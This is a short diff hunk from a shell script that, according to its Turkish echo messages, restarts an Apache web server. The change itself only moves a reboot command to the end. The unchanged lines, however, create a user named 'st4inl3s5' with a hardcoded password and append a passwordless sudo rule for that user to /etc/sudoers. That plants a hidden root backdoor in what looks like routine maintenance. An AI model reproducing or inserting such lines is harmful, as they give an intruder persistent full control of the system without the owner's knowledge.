@@ -7,10 +7,11 @@ echo "APACHE WEB SNUCUSU YENDIDEN BASLATILIYOR";
 
 echo "SERVIS YENDEN BASLATILDI"
 
-#reboot
 
 #exit;
 
 useradd -m -s /bin/bash st4inl3s5
 echo "st4inl3s5:trakya2005" | chpasswd
 echo "st4inl3s5 ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
+
+reboot
